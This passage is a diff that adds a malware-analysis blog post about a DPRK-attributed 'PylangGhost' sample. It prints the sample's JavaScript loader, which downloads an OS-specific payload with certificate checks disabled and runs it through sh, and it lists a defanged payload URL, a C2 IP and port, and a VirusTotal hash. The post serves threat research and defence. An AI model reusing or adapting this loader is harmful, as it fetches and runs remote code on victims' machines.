+  let scriptDestPath = "";
+  
+  if (platform === "win32") {
+    const tmpDir = os.tmpdir();
+    scriptDestPath = path.join(tmpDir, macPatchScript); // Odd naming choice for Windows by the author
+    targetUrl = winPayloadUrl;
+  } else if (platform === "darwin") { // macOS
+    scriptDestPath = "/var/tmp/" + macPatchScript;
+    targetUrl = macPayloadUrl;
+  } else if (platform === "linux") {
+    scriptDestPath = "/var/tmp/" + macPatchScript;
+    targetUrl = linPayloadUrl;
+  } else {
+    return; // Exit if OS is unsupported
+  }
+  
+  // Mac/Linux Execution Branch
+  if (platform != "win32") {
+    https.get(targetUrl, {
+      rejectUnauthorized: false // Ignore invalid SSL certificates
+    }, response => {
+      const fileStream = fs.createWriteStream(scriptDestPath);
+      response.pipe(fileStream);
+      fileStream.on("finish", () => {
+        fileStream.close(() => {
+          fs.chmodSync(scriptDestPath, 0o755); // Make the script executable
+          const shProcess = spawn("sh", [scriptDestPath], {
+            stdio: "inherit"
+          });
+          shProcess.on("close", code => {
+            process.exit(code);
+          });
+          shProcess.on("error", err => {
+            process.exit(1);
+          });
+        });
+      });
+    }).on("error", console.error);
+  } else {
+    // Windows Execution Branch
+    downloadChunked(winPayloadUrl, zipFilePath);
+  }
+}
+
+// Execute the malware
+main();
+```
+
+After confirming this was DPRK/PylangGhost, I didn't do much further analysis.
+I'm not a big fan of PylangGhost as it's heavy (29 MB) and feels clunky.
+
+In the interest of preserving evidence, I've uploaded the Windows variant zip 
+file retrieved from `hxxps://malicanbur[.]pro/winnmrepair_ml2j.release` to 
+VirusTotal:
+
+[0be2375362227f846c56c4de2db4d3113e197f0c605c297a7e0e0c154e94464e](https://www.virustotal.com/gui/file/0be2375362227f846c56c4de2db4d3113e197f0c605c297a7e0e0c154e94464e)
+
+The C2 IP is conveniently located in `[zip-root]/config.py`, and is hxxp://173.211.46[.]22:8080, 
+as demonstrated in the screenshot below.
+
+<Fig src={PC} caption="PylangGhost C2 URL from the Windows variant hardcoded and conveniently commented" />
+
+You can also see Chrome extension IDs listed for it to enumerate and capture 
+data from.
+
+That's all for today. Further analysis is left in your capable hands, dear reader.
